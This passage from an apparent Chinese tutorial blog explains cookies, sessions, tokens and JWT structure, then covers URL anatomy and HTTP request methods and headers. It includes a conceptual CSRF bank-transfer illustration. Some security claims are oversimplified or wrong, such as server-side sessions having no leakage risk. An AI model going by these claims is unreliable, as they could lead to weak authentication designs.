<p>Session 的常见应用场景包括：验证登录信息</p>
</div>

<p>Cookie的缺点在于其并<strong>不可靠</strong>和<strong>不安全</strong>，主要原因如下:</p>
<ul>
<li>浏览器不一定会保存服务器发来的cookie，用户可以通过设置选择是否保存cookie。</li>
<li>cookie是有生命周期的（通过Expire设置），如果超过周期，cookie就会被清除。</li>
<li>HTTP数据通过明文发送，容易受到攻击，因此不能在cookie中存放敏感信息（比如信用卡号，密码等）。</li>
<li>cookie以文件形式存储在客户端，用户可以随意修改的。</li>
</ul>
<p><strong>什么是session及session的工作原理</strong></p>
<p>session又名会话，其功能与应用场景与cookie类似，用来存储少量的数据或信息。但由于数据存储在服务器上，而不是客户端上，所以比cookie更安全。</p>
<p>Session工作的流程如下：</p>
<ul>
<li>客户端向服务器发送请求时，看本地是否有cookie文件。如果有，就在HTTP的请求头（Request Headers）中，包含一行cookie信息。</li>
<li>服务器接收到请求后，根据cookie信息，得到sessionId，根据sessionId找到对应的session，用这个session就能判断出用户是否登录等等。</li>
</ul>
<p>使用Session的好处在于，即使用户关闭了浏览器，session仍将保持到会话过期。</p>
<h5 id="1-3-1-Session的传输"><a href="#1-3-1-Session的传输" class="headerlink" title="1.3.1 Session的传输"></a>1.3.1 Session的传输</h5><ul>
<li>通过 Cookie 传输</li>
<li>URL地址重写</li>
</ul>
<p>Session 可以借助 Cookie 来传输，在 Cookie 中会有一个<code>sessionID</code>的键值对，他就是用来传输 Session 的。</p>
<p>一次打开浏览器时，session是可以多窗口共享的，子窗口可以使用符窗口的 Cookie，因此会共享一个 Session，但是重新打开浏览器（重新启动）会生成新的 Session。但是如果浏览器将 Cookie 功能禁用或者网站不支持 Cookie 时，这时候就不能够通过 Cookie 来传输 Session，所以就使用 URL 地址重写来进行 Session 的传输。</p>
<p>URL地址重写是对客户端不支持 Cookie 的解决方案。它的原理是将用户的 Session 的 ID 信息重写到 URL 地址中。服务器能够解析重写后的 URL，获取 Session 的 ID。 服务器会先自动判断客户端是否支持 Cookie。如果客户端支持，会将 URL 原封不动地输出，如果不支持，则会将 Session 的 ID 重写到 URL 中，重写后的 URL 可能是这样的：<code>https://mp.weixin.qq.com/s?jsessionid=BYjhghj89HBbuhygG-145</code></p>
<h5 id="1-3-2-Session的生命周期"><a href="#1-3-2-Session的生命周期" class="headerlink" title="1.3.2 Session的生命周期"></a>1.3.2 Session的生命周期</h5><p>需要区分开 Session 和 Session ID，Session 由服务器来进行存储，而且是<mark class="label warning">存储在内存中</mark>，不过 Session 可以通过特殊的方式做持久化管理（memcache，redis）。Session ID 存放在服务器以及客户端的 Cookie 中，客户端中的 Session ID 用来和服务器进行会话认证。</p>
<p>服务器内存中有许多的 Session，可以用使用 Session ID 来找到 Session 对象，这就是使用 Session ID 来标志 Session 的作用。</p>
<ul>
<li>在创建了 Session 的同时，服务器会为该 Session 生成唯一的Session ID，而这个Session ID 在随后的请求中会被用来重新获得已经创建的Session；</li>
<li>在 Session 被创建之后，就可以调用Session相关的方法往 Session 中增加内容了，而这些内容只会保存在服务器中，发到客户端的只有SessionID；</li>
<li>当客户端再次发送请求的时候，会将这个Session ID 带上，服务器接受到请求之后就会依据 Session ID 找到相应的 Session，从而再次使用之。</li>
</ul>
<div class="note danger"><p>Session 和 Session ID 的删除：</p>
<ol>
<li>当浏览器关闭时 Session ID 会删除而 Session 不会删除。</li>
<li>Session 删除的几种方式：超时、程序调用<code>HttpSession.invalidate()</code>、服务器关机或重启（内存数据丢失）。</li>
</ol>
</div>

<p>参考【<a href="https://blog.csdn.net/weixin_43625577/article/details/92393581">Cookie和Session、SessionID的那些事儿</a>】</p>
<h5 id="1-3-3-Cookie和Session的区别"><a href="#1-3-3-Cookie和Session的区别" class="headerlink" title="1.3.3 Cookie和Session的区别"></a>1.3.3 Cookie和Session的区别</h5><ol>
<li><strong>存储位置不同</strong></li>
</ol>
<p>通常情况</p>
<ul>
<li>Cookie 的数据信息存放在客户端浏览器上。</li>
<li>Session 的数据信息存放在服务器内存中。</li>
</ul>
<ol start="2">
<li><strong>存储容量不同</strong></li>
</ol>
<p>通常情况</p>
<ul>
<li>单个 Cookie 保存的数据<code>≤ 4KB</code>，一个站点最多保存<code>20</code>个 Cookie。</li>
<li>对于 Session 并没有上限，但出于对服务器端的性能考虑，Session 内不要存放过多的东西，并且设置 Session 删除机制。</li>
</ul>
<ol start="3">
<li><strong>存取方式的不同</strong></li>
</ol>
<ul>
<li>Cookie 中只能保管<code>ASCII</code>字符串，需要通过编码的方式存取<code>Unicode</code>字符或者二进制数据。运用 Cookie 难以实现存储略微复杂的信息。</li>
<li>Session中能够存取任何类型的数据，包括且不限于Sting、Integer、List、Map等。</li>
</ul>
<ol start="4">
<li><strong>隐私策略的不同</strong></li>
</ol>
<ul>
<li>Cookie 对客户端是可见的，别有用心的人可以分析存放在本地的 Cookie 并进行Cookie欺骗，所以它是不安全的。</li>
<li>Session 存储在服务器上，对客户端是透明的，不存在敏感信息泄露的风险。</li>
</ul>
<p>假如选用 Cookie，比较好的方法是：敏感的的信息，如账号密码等，尽量不要写到 Cookie中。可以将 Cookie 信息加密，提交到服多务器后再进行解密。存储在本地的 Cookie 就需要自行加密。</p>
<ol start="5">
<li><strong>有效期上的不同</strong></li>
</ol>
<ul>
<li>开发可以通过设置 Cookie的属性，达到使Cookie长期有效的效果。</li>
<li>由于Session依赖于名为<code>JSESSIONID</code>的 Cookie，而<code>Cookie JSESSIONID</code>的过期时间默认为<code>-1</code>，只需关闭窗口该 Session 就会失效。因而 Session 不能达到长期有效的效果，就算不依顿于 Cookie，运用 URL 地址重写也不能完成，因为假如设置 Session 的超时时间过长，服务器累计的 Session 就会越多，越容易导致内存溢出。</li>
</ul>
<ol start="6">
<li><strong>服务器压力的不同</strong></li>
</ol>
<ul>
<li>Session 是保管在服务器端内存中的，每个用户都会产生一个 Session。假如并发访问的用户很多，会产生很多的 Session，耗费大量的内存。</li>
<li>Cookie 保管在客户端，不占用服务器资源。对于并发用户很多的网站，Cookie 是很好的选择。</li>
</ul>
<ol start="7">
<li><strong>浏览器支持的不同</strong></li>
</ol>
<p>假如客户端浏览器不支持 Cookie。</p>
<ul>
<li>Cookie 是需要客户端浏览器支持的。假如客户端禁用了 Cookie， 或者不支持 Cookie，则会话跟踪会失效。关于 WAP 上的应用，常规的 Cookie 就派不上用场了。</li>
<li>运用 Session 需要使用URL地址重写的方式。一切用到 Session 程序的 URL 都要进行 URL 地址重写，否则Session 会话跟踪还会失效。关于 WAP 应用来说，Session+URL 地址重写或许是它唯一的选择。</li>
</ul>
<p>假如客户端支持Cookie。</p>
<ul>
<li>Cookie既能够设为本浏览器窗口以及子窗口内有效（把过期时间设为<code>-1</code>），也能够设为一切窗口内有效（把过期时间设为某个大于0的整数）。</li>
<li>Session 只能在本窗口以及其子窗口内有效。假如两个浏览器窗口互不相干，它们将运用两个不同的 Session（IE8 下不同窗口 Session 相干。）</li>
</ul>
<ol start="8">
<li><strong>跨域支持上的不同</strong></li>
</ol>
<ul>
<li>Cookie支持跨城名访问，例如，将<code>domain</code>属性设置为<code>.biaodianfu.com</code>，则以 <code>.biaodianfu.com</code>为后缀的一切域名均能够访问该 Cookie。跨域名 Cookie 如今被普遍用在网络中，例如，Google、Baidu、Sina 等。</li>
<li>Session 则不会支持跨坡名访问。Session 仅在它所在的城名内有效。</li>
</ul>
<h4 id="1-4-Token"><a href="#1-4-Token" class="headerlink" title="1.4 Token"></a>1.4 Token</h4><ul>
<li>Session 是用来解决 Cookie 的安全性的问题的，那么 Token 就是用来解决 Session 消耗内存问题而提升性能的。</li>
<li>Token 是使用时间换取空间的方法，即 CPU 计算验证的时间换取内存存储 Session 的空间。</li>
<li>Token 受同源策略限制，而 Cookie 和 Session 不受同源策略限制，故 Token 能够防范 CSRF 攻击。</li>
</ul>
<p><img data-src="https://i.loli.net/2020/11/03/MGPEQZzJ8YvUO9K.png" alt="未命名文件.png"></p>
<div class="note warning"><p>Token 的原理图如上图，可以概述为以下几点：</p>
<p>（1）客户端第一次请求时，发送用户信息到服务器。服务器收到用户信息并进行身份认证无误后，使用加密算法和密钥对用户信息进行签名，然后将被签名和数据作为 Token，返回给客户端。</p>
<p>（2）<strong>服务器端不保存 Token，客户端保存 Token</strong>。</p>
<p>（3）客户端再次发送请求时，在请求的信息中将 Token 一起发送给服务器。</p>
<p>（4）服务器使用同样的加密算法和密钥对数据再进行一次签名，然后对比计算得到的签名和 Token 的签名做比较进行认证。</p>
</div>

<p>运用 Token 服务器就不再需要保存 Session 了，只需要生成 Token 然后认证 Token，这就是服务器利用 CPU 计算时间换取 Session存储空间的方式。Token 可以放在 Cookie 中，若客户端不支持 Cookie，Token 也可以放置在请求头中。</p>
<p>Token 通常用于一种轻巧的规范下，这种规范叫做 JOSN Web Token（<mark class="label success">JWT</mark>）。</p>
<div class="note success"><p><strong>Token可以抵抗CSRF，Cookie + Session不行？</strong></p>
<p>假如用户正在登陆银行网页，同时登陆了攻击者的网页，并且银行网页未对csrf攻击进行防护。攻击者就可以在网页放一个表单，该表单提交src为<code>http://www.bank.com/api/transfer</code>，body为<code>count=1000&amp;to=Tom</code>。倘若是session+cookie，用户打开网页的时候就已经转给Tom1000元了.因为form 发起的 POST 请求并不受到浏览器同源策略的限制，因此可以任意地使用其他域的 Cookie 向其他域发送 POST 请求，形成 CSRF 攻击。在post请求的瞬间，cookie会被浏览器自动添加到请求头中。但token不同，token是开发者为了防范csrf而特别设计的令牌，浏览器不会自动添加到headers里，攻击者也无法访问用户的token，所以提交的表单无法通过服务器过滤，也就无法形成攻击。</p>
</div>

<p>参考文章：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/63061864">彻底理解cookie，session，token</a></li>
<li><a href="https://www.cnblogs.com/xuxinstyle/p/9675541.html">深入理解token</a></li>
<li><a href="https://www.cnblogs.com/lufeiludaima/p/pz20190203.html">什么是token及怎样生成token</a></li>
<li><a href="https://segmentfault.com/a/1190000017831088">彻底弄懂session，cookie，token</a></li>
</ul>
<h4 id="1-5-JOSN-Web-Token（JWT）"><a href="#1-5-JOSN-Web-Token（JWT）" class="headerlink" title="1.5 JOSN Web Token（JWT）"></a>1.5 JOSN Web Token（JWT）</h4><p>JOSN Web Token（JWT）是一种开放标准（ RFC 7519），它定义了一种紧凑且安全的标准，用于将各方之间的信息传输为 JSON 对象。该信息通过数字简明进行校验。使用 HMAC 算法或者使用 RSA 的公钥&#x2F;私钥对 JWT 进行检签名，但是在通信中为了提高通信的速度，所以一般使用对称密码算法进行数字签名。</p>
<p>JWT 由三部分组成：<mark class="label info">头部</mark>、<mark class="label warning">荷载</mark> 与 <mark class="label success">签名</mark>。</p>
<h5 id="1-5-1-头部-Header"><a href="#1-5-1-头部-Header" class="headerlink" title="1.5.1 头部( Header )"></a>1.5.1 头部( Header )</h5><p>头部用于描述关于 JWT 的最基本的信息，例如，其类型以及签名所用的算法等。它被表示成一个 JSON 对象。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line"><span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里，我们说明了这是一个<code>JWT</code>，并且我们所用的签名算法是<code>HS256</code>算法。</p>
<p>对它进行<mark class="label danger">Base64编码后</mark>形成的字符串就成了<code>JWT</code>的<code>header</code> (头部)。</p>
<h5 id="1-5-2-载荷-Payload"><a href="#1-5-2-载荷-Payload" class="headerlink" title="1.5.2 载荷( Payload )"></a>1.5.2 载荷( Payload )</h5><p>将添加好友的操作描述成一个<code>JSON</code>对象。其中添加了一些其他的信息，帮助今后收到这个<code>JWT</code>的服务器理解这个<code>JWT</code>。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;iss&quot;</span>: <span class="string">&quot;Kathy Yang JWT&quot;</span>, </span><br><span class="line"><span class="attr">&quot;iat&quot;</span>: <span class="number">1455624102</span>,</span><br><span class="line"><span class="attr">&quot;exp&quot;</span>: <span class="number">1475632522</span>,</span><br><span class="line"><span class="attr">&quot;aud&quot;</span>: <span class="string">&quot;www.example.com&quot;</span>,</span><br><span class="line"><span class="attr">&quot;sub&quot;</span>: <span class="string">&quot;jrocket@example.com&quot;</span>,</span><br><span class="line"><span class="attr">&quot;Givename&quot;</span>: <span class="string">&quot;Smark&quot;</span>,</span><br><span class="line"><span class="attr">&quot;Surname&quot;</span>: <span class="string">&quot;Kathy&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里面的前五个字段都是由<code>JWT</code>的标准所定义的。</p>
<ul>
<li><code>iss</code>：该<code>JWT</code>的签发者。</li>
<li><code>sub</code>：该<code>JWT</code>所面向的用户。</li>
<li><code>aud</code>：接收该<code>JWT</code>的一方。</li>
<li><code>exp</code>(<code>expires</code>)：什么时候过期，这里是一个<code>UNIX</code>时间戳。</li>
<li><code>iat</code>(<code>issued at</code>)：在什么时候签发的。</li>
</ul>
<p>将上面的<code>JSON</code>对象进行<mark class="label danger">Base64编码后</mark>可以得到一串字符串。这个字符串我们将它称作<code>JWT</code>的<code>Payload</code> (载荷)。</p>
<h5 id="1-5-3-签名-Signature"><a href="#1-5-3-签名-Signature" class="headerlink" title="1.5.3 签名( Signature )"></a>1.5.3 签名( Signature )</h5><p>将上面的两个编码后的字符串都用符号 <code>.</code> 连接在一起 （头部在前），就形成了一串新的字符串。最后，我们将上面拼接完的字符串用<code>HS256</code>算法进行加密。在加密的时候，我们还需要提供一个密钥（<code>secret</code>）。通过密钥和加密算法加密后的部分就叫作签名。</p>
<p>总结 <code>JWT</code> 生成过程为：</p>
<div class="note primary"><ol>
<li>头部<code>JSON</code>对象 --&gt; <code>Base64</code>  --&gt; <code>JWT</code>的头部<code>Head</code></li>
<li>荷载<code>JSON</code>对象 --&gt; <code>Base64</code>  --&gt; <code>JWT</code>的荷载<code>Payload</code></li>
<li><code>JWTHead.JWTPayload</code>  --&gt;  <code>HS256</code>加密   --&gt; <code>JWT</code>的签名<code>Signature</code></li>
<li><code>JWT</code>的完整格式：<mark class="label success">Head</mark><mark class="label danger">.</mark><mark class="label success">Payload</mark><mark class="label danger">.</mark><mark class="label success">Signature</mark></li>
</ol>
</div>



<p>下面通过一个实例了解<code>JWT</code>机制实现认证的过程。当用户第一次登录系统时，如图4.17所示。</p>
<p>创建<code>JWT</code>的步骤如下。</p>
<p>(1)第一次登录，用户从客户端输人用户名&#x2F;密码，提交后到服务器的登录处理<code>Action</code>层 （ <code>Login Action</code>）。</p>
<p><img data-src="https://i.loli.net/2020/11/04/m1GFIQfnhrzsACE.png" alt="Login Action.png"></p>
<p><img data-src="https://i.loli.net/2020/11/04/PjdGCvabwDmqFxn.png" alt="第4章 接口测试的基础 2.png"></p>
<p><img data-src="https://i.loli.net/2020/11/04/TA2LqSRjkVfgxBe.png" alt="1598504-20190202220449263-1608141775.png"></p>
<h3 id="2-HTTP-协议"><a href="#2-HTTP-协议" class="headerlink" title="2 HTTP 协议"></a>2 HTTP 协议</h3><p>网络协议就是为计算机网络中进行数据交换而建立的规则、标准或约定的集合。</p>
<p>为了使不同计算机厂家 生产的计算机能够相互通信，以便在更大的范围内建立计算机网络，国际标准化组织（ISO）在1978 年提出了“开放系统互联参考模型”，即著名的 OSIRM 模型（Open System Itereonnection&#x2F;RefrerceModel）。它将计算机网络体系结构的通信协议划分为七层，自下而上依次为：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。</p>
<p>每一层都有其不同的含义及网络协议。</p>
<table>
<thead>
<tr>
<th align="center">网络结构层</th>
<th>协议</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>物理层</strong></td>
<td>以太网、调制解调器、电力线通信(PLC)、SONET&#x2F;SDH、光导纤维、同轴电缆、双绞线等。</td>
</tr>
<tr>
<td align="center"><strong>数据链路层</strong></td>
<td>Wi-Fi(EEE 82.11)、WiMAX(IEEE 802.16)、ATM、令牌环、PPP、L2TP、PPTP等。</td>
</tr>
<tr>
<td align="center"><strong>网络层协议</strong></td>
<td>IP(IPv4、IPv6)、ICMP、ICMPv6、IGMP、IS-IS、IPsec、 ARP、RARP等。</td>
</tr>
<tr>
<td align="center"><strong>传输层协议</strong></td>
<td>TCP、UDP、TLS、 DCCP、SCTP、 RSVP、 OSPF 等。</td>
</tr>
<tr>
<td align="center"><strong>应用层协议</strong></td>
<td>DNS、FTP、Gopher、HTTP、IMAP4、POP3、SIP、SSH、TELNET、RPC、SDP、SOAP、GTP等。</td>
</tr>
</tbody></table>
<p>本节主要讲的就是应用层中被应用最多的协议：HTTP 协议。</p>
<h4 id="2-1-HTTP-协议介绍"><a href="#2-1-HTTP-协议介绍" class="headerlink" title="2.1 HTTP 协议介绍"></a>2.1 HTTP 协议介绍</h4><p>HTTP&#x2F;1.0 没有充分考虑分层代理、缓存以及持久连接和虚拟主机的需求的影响。并且随着不完善的 HTTP&#x2F;1.0 应用程序的激增，迫切需要一个新的版本，以便使两个通信程序能够确定彼此真实的能力。此规范协议叫做<mark class="label primary">HTTP/1.1</mark>，这个协议与<mark class="label success">HTTP/1.0</mark>相比，更为严格，以确保各个协议的特征得到可靠实现。</p>
<p>把HTTP协议的官方定义进行归纳，得出HTTP协议的4个关键点。</p>
<p>（1）HTTP 是建立在 TCP&#x2F;IP 协议之上，面向应用层的超文本传输协议。</p>
<p>（2）它由请求和响应组成，完全符合标准的客户端服务器的请求响应模型。</p>
<p>（3）协议很轻便简单，并且请求与请求间没有关联，是无状态性的协议。</p>
<p>（4）为了弥补这种无状态性就需要使用 HTTP 协议的扩展 Cookie 等方式建立关联。</p>
<p>（5）HTTP 协议工作于客户端-服务器的架构上，采用请求&#x2F;响应模型。</p>
<h4 id="2-2-Uniform-Resource-Locator（URL）"><a href="#2-2-Uniform-Resource-Locator（URL）" class="headerlink" title="2.2 Uniform Resource Locator（URL）"></a>2.2 Uniform Resource Locator（URL）</h4><ul>
<li>URL：统一资源定位器&#x2F;统一资源定位系统。HTTP&#x2F;1.0支持：GET、POST、HEAD三种HTTP请求方法。</li>
<li>URI：统一资源定位标识符（Uniform Resource Identifiers），URL 是一种特殊类型的 URI，包含了用于查找某个资源的足够的信息。HTTP&#x2F;1.1是当前正在使用的版本。该版本默认采用持久连接，并能很好地配合代理服务器工作。还支持以管道方式同时发送多个请求，以便降低线路负载，提高传输速度。HTTP&#x2F;1.1 新增了：OPTIONS、PUT、DELETE、TRACE、CONNECT 五种 HTTP 请求方法。</li>
</ul>
<p>URL 的基本格式如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">schema://host[:port#]/path/.../[;url-params][?query-string][#anchor]</span><br><span class="line">&lt;方案&gt;://&lt;用户名&gt;:&lt;密码&gt;@主机:端口/路径;参数?查询#片段</span><br></pre></td></tr></table></figure>

<p>URL主要有三个作用。</p>
<p>（1）HTTP 是 URL 的方案，方案告诉客户端使用什么样的协议去访问服务器。</p>
<p>（2）<code>Host: www.example.com</code>， 指服务器的位置。</p>
<p>（3）<code>/index.html</code>是资源路径，说明了请求的是服务器上哪个特定的本地资源。</p>
<p>我们以链接<code>http://www.kath2.com/news/index.asp?ID=210&amp;page=1#name</code> 为例，对 URL 进行详解。</p>
<p>URL 一般分为以下几个部分。</p>
<ol>
<li><strong>协议部分</strong>：该 URL 的协议部分为<code>HTTP:</code>，这代表网页使用的是 HTTP 协议。在 Internet 中可以使用多种协议，如HTTPS、Ftp 等。在<code>HTTP</code>后面的<code>//</code>为分隔符。</li>
<li><strong>域名部分</strong>：该 URL 的域名部分为<code>www.kath2.com</code> 。一个 URL 中，也可以使用 IP 地址作为域名使用。</li>
<li><strong>端口部分</strong>：跟在域名后面的是端口，域名和端口之间使用 <code>.</code> 作为分隔符。端口不是一 个 URL 必需的部分，如果省略端口部分，将采用默认端口。例如，HTTP 的默认端口为<code>80</code>, HTTPS 的默认端口为<code>443</code>。</li>
<li><strong>虚拟目录部分</strong>：从域名后的第一个<code>/</code>开始到最后一个<code>/</code>为止，是虛拟目录部分。 虚拟目录也不是一个 URL必需的部分。本例中的虚拟目录是<code>/news/</code>。</li>
<li><strong>文件名部分</strong>：从域名后的最后一个<code>/</code>开始到<code>?</code>为止，是文件名部分。<ol>
<li>如果没有<code>?</code>，则是从域名后的最后一个<code>/</code>开始到<code>#</code>为止，是文件名部分。 </li>
<li>如果没有<code>?</code>和<code>#</code>，那么从域名后的最后一个<code>/</code>开始到结束，都是文件名部分。 本例中的文件名是<code>index.asp</code> 。文件名部分也不是一个 URL 必需的部分，如果省略该部分，则使用默认的文件名。</li>
</ol>
</li>
<li><strong>锚部分</strong>：从<code>#</code>开始到最后，都是锚部分。本例中的锚部分是<code>name</code> 。锚部分也不是一个 URL 必需的部分。</li>
<li><strong>参数部分</strong>：从<code>?</code>开始到<code>#</code> 为止之间的部分为参数部分，又称搜索部分、查询部分。 本例中的参数部分为<code>ID= -210&amp;page=1</code>。可以允许有多个参数，参数与参数之间用<code>&amp;</code>作为分隔符。</li>
</ol>
<h4 id="2-3-请求报文（request）"><a href="#2-3-请求报文（request）" class="headerlink" title="2.3 请求报文（request）"></a>2.3 请求报文（request）</h4><h5 id="2-3-1-报文格式"><a href="#2-3-1-报文格式" class="headerlink" title="2.3.1 报文格式"></a>2.3.1 报文格式</h5><p><img data-src="https://i.loli.net/2020/11/06/3eD81tGJxwgSfIV.png" alt="屏幕快照 2020-11-06 下午2.37.26.png"></p>
<p>request 报文的结构分为 4 部分：</p>
<ul>
<li>请求行（request line）</li>
<li>请求头部（header）</li>
<li>空行</li>
<li>主体（body）</li>
</ul>
<p>header 和 body 之间有个<mark class="label warning">空行</mark>。</p>
<p><img data-src="https://i.loli.net/2020/11/06/21ah8vLkg9Np37m.png" alt="1820506-20190928150409842-1112819644 (1).png"></p>
<h5 id="2-3-2-请求行"><a href="#2-3-2-请求行" class="headerlink" title="2.3.2 请求行"></a>2.3.2 请求行</h5><p><strong>一、请求方法</strong></p>
<p>请求行中包括请求方法（<strong>GET、POST、HEAD、PUT、DELETE、OPTIONS、TRACE、CONNECT</strong>），其中最常用的为<strong>GET、POST</strong>。</p>
<p>请求的起始行以方法作为开始，方法用来告诉服务器要如何做。</p>
<p>在开发中通常有两种请求方式。</p>
<table>
<thead>
<tr>
<th align="center">请求方式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>GET</strong></td>
<td align="left">是以实体的方式得到由请求URI所指定资源的信息，如果请求 URI 只是一个数据产生过程，那么最终要在响应实体中返回的是处理过程的结果所指向的资源，而不是处理过程的描述。</td>
</tr>
<tr>
<td align="center"><strong>POST</strong></td>
<td align="left">用来向目的服务器发出请求，要求它接收被附在请求后的实体，并把它当作请求队列中请求 URI 所指定资源的附加新子项，所以 post 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。</td>
</tr>
<tr>
<td align="center"><strong>HEAD</strong></td>
<td align="left">类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头。</td>
</tr>
<tr>
<td align="center"><strong>DELETE</strong></td>
<td align="left">请求服务器删除指定的页面。</td>
</tr>
<tr>
<td align="center"><strong>CONNECT</strong></td>
<td align="left">HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td>
</tr>
<tr>
<td align="center"><strong>OPTIONS</strong></td>
<td align="left">允许客户端查看服务器的性能。</td>
</tr>
<tr>
<td align="center"><strong>TRACE</strong></td>
<td align="left">回显服务器收到的请求，主要用于测试或调试。</td>
</tr>
</tbody></table>
<p><strong>二、HTTP版本</strong></p>
<table>
<thead>
<tr>
<th align="center">协议版本</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>HTTP&#x2F;1.0</strong></td>
<td>HTTP&#x2F;1.0支持：GET、POST、HEAD三种HTTP请求方法。</td>
</tr>
<tr>
<td align="center"><strong>HTTP&#x2F;1.1</strong></td>
<td>HTTP&#x2F;1.1是当前正在使用的版本。该版本默认采用持久连接，并能很好地配合代理服务器工作。还支持以管道方式同时发送多个请求，以便降低线路负载，提高传输速度。HTTP&#x2F;1.1新增了：OPTIONS、PUT、DELETE、TRACE、CONNECT 五种 HTTP 请求方法。</td>
</tr>
</tbody></table>
<p>　</p>
<h5 id="2-3-3-请求头"><a href="#2-3-3-请求头" class="headerlink" title="2.3.3 请求头"></a>2.3.3 请求头</h5><p>请求报头域主要用于指定被请求资源的 Internet 主机和端口号，它通常从 HTTP URL 中提取出来。</p>
<p>请求报文的 header 属性为以下六个部分：</p>
<ul>
<li>Cache</li>
<li>Client</li>
<li>Cookies</li>
<li>Miscellaneou</li>
<li>Security</li>
<li>Transport</li>
</ul>
<p><strong>一、Cache</strong> 头域</p>
<table>
<thead>
<tr>
<th align="center">Cache 字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>Cache-Control</strong></td>
<td>用来指定Response-Request遵循的缓存机制。各个指令含义如下。<br/><strong>Cache-Control:Public</strong>：可以被任何缓存所缓存。<br/><strong>Cache-Control:Private</strong>：指示响应信息的全部或部分用于单个用户，而不能用一个共享缓存来缓存。这可以让源服务器指示，响应的特定部分只用于一个用户，而对其他用户的请求则是一个不可靠的响应。<br/><strong>Cache-Control:no-cache</strong>：所有内容都不会被缓存，请求头里的<code>no-cache</code>表示浏览器不想读 缓存，并不是说没有缓存。一般在浏览器按<code>Ctrl+F5</code>键强制刷新时，请求头里也会有这个<code>no-cache</code>，也就是跳过强缓存和协商缓存阶段，直接请求服务器。<br/><strong>Cache-Control:max-age&#x3D;0</strong>：指示客户端愿意接收其绝对时间不大于指定的时间，以秒计。 如果直接按<code>F5</code>键的话，请求头是<code>max-age =0</code>，只跳过强缓存，但进行协商缓存。</td>
</tr>
<tr>
<td align="center"><strong>if-Modified-Since</strong></td>
<td>把浏览器端缓存页面的最后修改时间发送到服务器去，服务器会把这个时间与服务器上实际文件的最后修改时间进行对比。如果时间一致，那么返回<mark class="label primary">304</mark>，客户端就直接使用本地缓存文件。如果时间不一致，就会返回<mark class="label success">200</mark>和新的文件内容。客户端接到之后，会丢弃旧文件，把新文件缓存起来，并显示在浏览器中。<br/><strong>本地文件的修改时间和服务器上的文件修改时间一致， 说明文件没有被更新。HTTP服务器返回304，告诉客户端使用本地缓存文件。</strong></td>
</tr>
<tr>
<td align="center"><strong>If-None-Match</strong></td>
<td><mark class="label warning">If-None-Match</mark>和<mark class="label info">ETag</mark>一起工作，工作原理是在<code>HTTP response</code> 中添加 ETag 信息。当用户再 次请求该资源时，将在 <code>HTTP request</code> 中加入<code>If-None-Match</code>信息( <code>ETag</code>的值)。如果服务器验证资源的<code>ETag</code>没有改变(该资源没有更新)，将返回一个<code>304</code>状态告诉客户端使用本地缓存文件，否则将返回<code>200</code>状态和新的资源和<code>Etag</code>。 使用这样的机制将提高网站的性能。<br/><code>If-None-Mach</code>和<code>ETag</code>的值一致， 说明文件没有被更新。服务器将返回<code>304</code>，告诉客户端使用本地缓存文件。<br/></td>
</tr>
<tr>
<td align="center">Pragma</td>
<td>防止页面被缓存，<code>HTTP/L.1</code>版本中， 它和<code>Cache-Coltrol:no-cache</code>的作用一模一样。 <code>Pargma</code>只有一个用法，例如，<code>Pragma: no-cache</code>。</td>
</tr>
</tbody></table>
<p><strong>二、Client头域</strong></p>
<table>
<thead>
<tr>
<th>Client字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Accept</strong></td>
<td>浏览器端可以接收的媒体类型。<br/><mark class="label success">Accept: text/html</mark> 代表浏览器可以接收服务器发回的类型为<code>text/html</code>也就是我们常说的<code>HTML</code>文档，如果服务器无法返回<code>text/html</code>类型的数据，服务器应该返回一个<mark class="label info">406</mark>错误（non acceptable）<br/><mark class="label success">Accept:*/*</mark> 通配符<code>*</code>代表任意类型。代表浏览器可以处理所有类型。<br/><mark class="label success">Accept -Encoding</mark>  浏览器声明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法 ( <code>gzip</code>，<code>deflate</code>) 。例如，<code>Accept-Encoding: gzip, deflate</code><br/><mark class="label success">Accept - Language</mark>   浏览器声明自己接收的语言。语言跟字符集的区别是：中文是语言，中文有多种字符集，比 如<code>bigs</code>、<code>gb2312</code>、<code>gbk</code>等。</td>
</tr>
<tr>
<td><strong>User-Agent</strong></td>
<td>告诉 HTTP 服务器客户端使用的操作系统和浏览器的名称和版本。我们上网登录论坛的时候，往往会看到一些欢迎信息，其中列出了你的操作系统的名称和版本、你所使用的浏览器的名称和版本，实际上，服务器应用程序就是从<code>User-Agent</code>这个请求报头域中获取到这些信息的。</td>
</tr>
<tr>
<td><strong>Accept-Charset</strong></td>
<td>浏览器声明自己接收的字符集，如<code>gb2312</code>、<code>utf-8</code>等。</td>
</tr>
</tbody></table>
<p><strong>三、Cookie</strong></p>
<table>
<thead>
<tr>
<th>Cookie字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Cookie</strong></td>
<td>最重要的 header，将Cookie 的值发送给 HTTP 服务器。</td>
</tr>
</tbody></table>
<p><strong>四、Miscellaneous 头域</strong></p>
<table>
<thead>
<tr>
<th>Miscellaneous字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Referer</strong></td>
<td>提供了 request 的上下文信息的服务器，告诉服务器我是从哪个链接过来的。有些统计数据需要用到此头域。比如从我的主页上链接到统计服务器那里，该服务器就能够从<code>HTTP Referer</code>中统计出每天有多少用户点击我主页上的链接访问他的网站。</td>
</tr>
</tbody></table>
